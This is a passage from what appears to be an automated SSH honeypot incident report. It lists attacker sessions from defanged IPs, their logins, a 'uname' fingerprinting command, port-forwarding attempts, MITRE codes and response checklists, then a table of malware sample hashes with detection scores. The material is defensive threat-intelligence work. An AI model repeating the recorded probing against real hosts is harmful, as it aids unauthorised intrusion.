| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:55` | `cowrie.session.connect` |
| `2026-08-08 17:18:55` | `cowrie.client.version` |
| `2026-08-08 17:18:55` | `cowrie.client.kex` |
| `2026-08-08 17:18:55` | `cowrie.login.success` |
| `2026-08-08 17:18:56` | `cowrie.session.params` |
| `2026-08-08 17:18:56` | `cowrie.command.input` |
| `2026-08-08 17:18:56` | `cowrie.log.closed` |
| `2026-08-08 17:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae4a40a61df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:02` | `cowrie.session.connect` |
| `2026-08-08 17:19:02` | `cowrie.client.version` |
| `2026-08-08 17:19:02` | `cowrie.client.kex` |
| `2026-08-08 17:19:03` | `cowrie.login.success` |
| `2026-08-08 17:19:03` | `cowrie.session.params` |
| `2026-08-08 17:19:03` | `cowrie.command.input` |
| `2026-08-08 17:19:03` | `cowrie.log.closed` |
| `2026-08-08 17:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb24c86724a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:09` | `cowrie.session.connect` |
| `2026-08-08 17:19:09` | `cowrie.client.version` |
| `2026-08-08 17:19:09` | `cowrie.client.kex` |
| `2026-08-08 17:19:09` | `cowrie.login.success` |
| `2026-08-08 17:19:10` | `cowrie.session.params` |
| `2026-08-08 17:19:10` | `cowrie.command.input` |
| `2026-08-08 17:19:10` | `cowrie.log.closed` |
| `2026-08-08 17:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9af6119f9f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:15` | `cowrie.session.connect` |
| `2026-08-08 17:19:15` | `cowrie.client.version` |
| `2026-08-08 17:19:15` | `cowrie.client.kex` |
| `2026-08-08 17:19:16` | `cowrie.login.success` |
| `2026-08-08 17:19:17` | `cowrie.session.params` |
| `2026-08-08 17:19:17` | `cowrie.command.input` |
| `2026-08-08 17:19:17` | `cowrie.log.closed` |
| `2026-08-08 17:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa17ef69a96

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:21` | `cowrie.session.connect` |
| `2026-08-08 17:19:21` | `cowrie.client.version` |
| `2026-08-08 17:19:21` | `cowrie.client.kex` |
| `2026-08-08 17:19:22` | `cowrie.login.success` |
| `2026-08-08 17:19:22` | `cowrie.session.params` |
| `2026-08-08 17:19:22` | `cowrie.command.input` |
| `2026-08-08 17:19:23` | `cowrie.log.closed` |
| `2026-08-08 17:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd2851e48fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:28` | `cowrie.session.connect` |
| `2026-08-08 17:19:28` | `cowrie.client.version` |
| `2026-08-08 17:19:28` | `cowrie.client.kex` |
| `2026-08-08 17:19:29` | `cowrie.login.success` |
| `2026-08-08 17:19:30` | `cowrie.session.params` |
| `2026-08-08 17:19:30` | `cowrie.command.input` |
| `2026-08-08 17:19:30` | `cowrie.log.closed` |
| `2026-08-08 17:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6deccf232761

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:35` | `cowrie.session.connect` |
| `2026-08-08 17:19:35` | `cowrie.client.version` |
| `2026-08-08 17:19:35` | `cowrie.client.kex` |
| `2026-08-08 17:19:36` | `cowrie.login.success` |
| `2026-08-08 17:19:37` | `cowrie.session.params` |
| `2026-08-08 17:19:37` | `cowrie.command.input` |
| `2026-08-08 17:19:37` | `cowrie.log.closed` |
| `2026-08-08 17:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa7ea59c17c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:42` | `cowrie.session.connect` |
| `2026-08-08 17:19:42` | `cowrie.client.version` |
| `2026-08-08 17:19:43` | `cowrie.client.kex` |
| `2026-08-08 17:19:43` | `cowrie.login.success` |
| `2026-08-08 17:19:44` | `cowrie.session.params` |
| `2026-08-08 17:19:44` | `cowrie.command.input` |
| `2026-08-08 17:19:44` | `cowrie.log.closed` |
| `2026-08-08 17:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c1b1837775

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:50` | `cowrie.session.connect` |
| `2026-08-08 17:19:50` | `cowrie.client.version` |
| `2026-08-08 17:19:50` | `cowrie.client.kex` |
| `2026-08-08 17:19:50` | `cowrie.login.success` |
| `2026-08-08 17:19:51` | `cowrie.session.params` |
| `2026-08-08 17:19:51` | `cowrie.command.input` |
| `2026-08-08 17:19:51` | `cowrie.log.closed` |
| `2026-08-08 17:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e3b2825fb1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:19 |
| **Last Seen** | 2026-08-08 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:19:55` | `cowrie.session.connect` |
| `2026-08-08 17:19:55` | `cowrie.client.version` |
| `2026-08-08 17:19:55` | `cowrie.client.kex` |
| `2026-08-08 17:19:56` | `cowrie.login.success` |
| `2026-08-08 17:19:57` | `cowrie.session.params` |
| `2026-08-08 17:19:57` | `cowrie.command.input` |
| `2026-08-08 17:19:58` | `cowrie.log.closed` |
| `2026-08-08 17:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5b318d12f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:01` | `cowrie.session.connect` |
| `2026-08-08 17:20:01` | `cowrie.client.version` |
| `2026-08-08 17:20:01` | `cowrie.client.kex` |
| `2026-08-08 17:20:02` | `cowrie.login.success` |
| `2026-08-08 17:20:03` | `cowrie.session.params` |
| `2026-08-08 17:20:03` | `cowrie.command.input` |
| `2026-08-08 17:20:03` | `cowrie.log.closed` |
| `2026-08-08 17:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326dfae63481

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:06` | `cowrie.session.connect` |
| `2026-08-08 17:20:07` | `cowrie.client.version` |
| `2026-08-08 17:20:07` | `cowrie.client.kex` |
| `2026-08-08 17:20:07` | `cowrie.login.success` |
| `2026-08-08 17:20:08` | `cowrie.session.params` |
| `2026-08-08 17:20:08` | `cowrie.command.input` |
| `2026-08-08 17:20:08` | `cowrie.log.closed` |
| `2026-08-08 17:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-958ece3a26ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:13` | `cowrie.session.connect` |
| `2026-08-08 17:20:13` | `cowrie.client.version` |
| `2026-08-08 17:20:13` | `cowrie.client.kex` |
| `2026-08-08 17:20:14` | `cowrie.login.success` |
| `2026-08-08 17:20:15` | `cowrie.session.params` |
| `2026-08-08 17:20:15` | `cowrie.command.input` |
| `2026-08-08 17:20:15` | `cowrie.log.closed` |
| `2026-08-08 17:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed089e97bd24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:19` | `cowrie.session.connect` |
| `2026-08-08 17:20:19` | `cowrie.client.version` |
| `2026-08-08 17:20:19` | `cowrie.client.kex` |
| `2026-08-08 17:20:20` | `cowrie.login.success` |
| `2026-08-08 17:20:21` | `cowrie.session.params` |
| `2026-08-08 17:20:21` | `cowrie.command.input` |
| `2026-08-08 17:20:21` | `cowrie.log.closed` |
| `2026-08-08 17:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2edaaf59d1e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:26` | `cowrie.session.connect` |
| `2026-08-08 17:20:26` | `cowrie.client.version` |
| `2026-08-08 17:20:27` | `cowrie.client.kex` |
| `2026-08-08 17:20:27` | `cowrie.login.success` |
| `2026-08-08 17:20:28` | `cowrie.session.params` |
| `2026-08-08 17:20:28` | `cowrie.command.input` |
| `2026-08-08 17:20:28` | `cowrie.log.closed` |
| `2026-08-08 17:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b77b47a1153

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:20 |
| **Last Seen** | 2026-08-08 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:20:33` | `cowrie.session.connect` |
| `2026-08-08 17:20:33` | `cowrie.client.version` |
| `2026-08-08 17:20:33` | `cowrie.client.kex` |
| `2026-08-08 17:20:33` | `cowrie.login.success` |
| `2026-08-08 17:20:34` | `cowrie.session.params` |
| `2026-08-08 17:20:34` | `cowrie.command.input` |
| `2026-08-08 17:20:34` | `cowrie.log.closed` |
| `2026-08-08 17:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e7c10c825c

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-08 17:28 |
| **Last Seen** | 2026-08-08 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:28:12` | `cowrie.session.connect` |
| `2026-08-08 17:28:13` | `cowrie.client.version` |
| `2026-08-08 17:28:13` | `cowrie.client.kex` |
| `2026-08-08 17:28:15` | `cowrie.login.success` |
| `2026-08-08 17:28:16` | `cowrie.direct-tcpip.request` |
| `2026-08-08 17:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1108ba2bd75

| Field | Detail |
|---|---|
| **Source IP** | `176.172.239[.]193` |
| **First Seen** | 2026-08-08 17:33 |
| **Last Seen** | 2026-08-08 17:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:33:03` | `cowrie.session.connect` |
| `2026-08-08 17:33:03` | `cowrie.client.version` |
| `2026-08-08 17:33:03` | `cowrie.client.kex` |
| `2026-08-08 17:33:04` | `cowrie.login.success` |
| `2026-08-08 17:33:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 17:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.172.239[.]193` to AbuseIPDB if not already reported
- [ ] Block `176.172.239[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443ba7940857

| Field | Detail |
|---|---|
| **Source IP** | `70.89.116[.]5` |
| **First Seen** | 2026-08-08 18:07 |
| **Last Seen** | 2026-08-08 18:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 18:07:25` | `cowrie.session.connect` |
| `2026-08-08 18:07:26` | `cowrie.client.version` |
| `2026-08-08 18:07:26` | `cowrie.client.kex` |
| `2026-08-08 18:07:27` | `cowrie.login.success` |
| `2026-08-08 18:07:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 18:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.89.116[.]5` to AbuseIPDB if not already reported
- [ ] Block `70.89.116[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95a69e58c97f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]11` |
| **First Seen** | 2026-08-08 18:30 |
| **Last Seen** | 2026-08-08 18:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 18:30:27` | `cowrie.session.connect` |
| `2026-08-08 18:30:28` | `cowrie.client.version` |
| `2026-08-08 18:30:28` | `cowrie.client.kex` |
| `2026-08-08 18:30:30` | `cowrie.login.success` |
| `2026-08-08 18:30:31` | `cowrie.direct-tcpip.request` |
| `2026-08-08 18:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]11` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd22784a403

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-08 18:36 |
| **Last Seen** | 2026-08-08 18:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 18:36:52` | `cowrie.session.connect` |
| `2026-08-08 18:36:53` | `cowrie.client.version` |
| `2026-08-08 18:36:53` | `cowrie.client.kex` |
| `2026-08-08 18:36:55` | `cowrie.login.success` |
| `2026-08-08 18:36:56` | `cowrie.direct-tcpip.request` |
| `2026-08-08 18:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba68669ec70

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-08-08 18:37 |
| **Last Seen** | 2026-08-08 18:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 18:37:01` | `cowrie.session.connect` |
| `2026-08-08 18:37:02` | `cowrie.client.version` |
| `2026-08-08 18:37:02` | `cowrie.client.kex` |
| `2026-08-08 18:37:04` | `cowrie.login.success` |
| `2026-08-08 18:37:05` | `cowrie.direct-tcpip.request` |
| `2026-08-08 18:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **6** | 2026-08-08 17:02 | 2026-08-08 18:46 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-08 17:01 | 2026-08-08 18:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-08-08 18:15 | 2026-08-08 18:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `196.25.94[.]222` | **2** | 2026-08-08 17:50 | 2026-08-08 17:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.55.126[.]88` | **2** | 2026-08-08 17:02 | 2026-08-08 18:27 | 3m | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]7` | **2** | 2026-08-08 16:55 | 2026-08-08 17:02 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.77[.]231` | 1 | 2026-08-08 17:12 | 2026-08-08 17:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-08 17:10 | 2026-08-08 17:11 | 37s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-08-08 18:12 | 2026-08-08 18:14 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
